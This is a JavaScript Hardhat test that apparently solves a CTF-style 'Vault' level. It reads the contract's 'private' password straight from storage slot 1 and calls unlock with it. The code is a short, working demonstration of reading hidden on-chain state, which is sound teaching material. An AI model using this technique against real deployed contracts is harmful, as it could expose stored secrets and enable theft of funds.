const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Vault", function () {
  it("Should guess the password", async function () {
    // Generate random bytes 32
    const randBytes = ethers.BigNumber.from(ethers.utils.randomBytes(32))
    const [_, eoa] = await ethers.getSigners()
    const Contract = await ethers.getContractFactory("Vault")
    const contract = await Contract.deploy(randBytes)
    await contract.deployed()

    // Get data at slot 1
    // First slot is `locked` second slot is `password`
    const password = await contract.provider.getStorageAt(contract.address, 1)

    await contract.unlock(password);

    expect(await contract.locked()).to.be.equal(false)
  });
});
